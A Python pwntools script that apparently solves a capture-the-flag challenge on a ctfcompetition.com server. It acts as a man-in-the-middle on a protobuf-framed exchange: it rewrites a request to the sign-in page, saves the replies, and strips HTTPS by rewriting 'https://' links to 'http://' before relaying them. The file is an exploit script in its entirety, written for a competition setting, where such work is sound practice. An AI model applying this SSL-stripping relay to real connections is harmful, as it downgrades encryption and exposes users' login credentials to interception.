from pwn import *
import struct
import binascii
import format_pb2

context(arch='x86_64', os='linux')

conn = remote('ssl-added-and-removed-here.ctfcompetition.com', 19121, ssl=True)


def read_msg():
	length = u32(conn.recv(4))
	log.debug("< (len): %d" % length)
	request = format_pb2.Exchange()
	data = conn.recvn(length)
	request.ParseFromString(data)
	log.info("< %s" % request)
	return request

def send_msg(payload):
	log.info("> %s" % payload)
	data = payload.SerializeToString()
	output = p32(len(data)) + data
	conn.send(output)

# Request to server
i = read_msg()
i.request.uri = "/user/sign_in"
send_msg(i)

# Reply back to client
i = read_msg()

f = open("test_request.html", "wb")
f.write(i.reply.body)
f.close()

i.reply.body = i.reply.body.replace('https://elided','http://elided')

f = open("test_reply.html", "wb")
f.write(i.reply.body)
f.close()

send_msg(i)

i = read_msg()
send_msg(i)
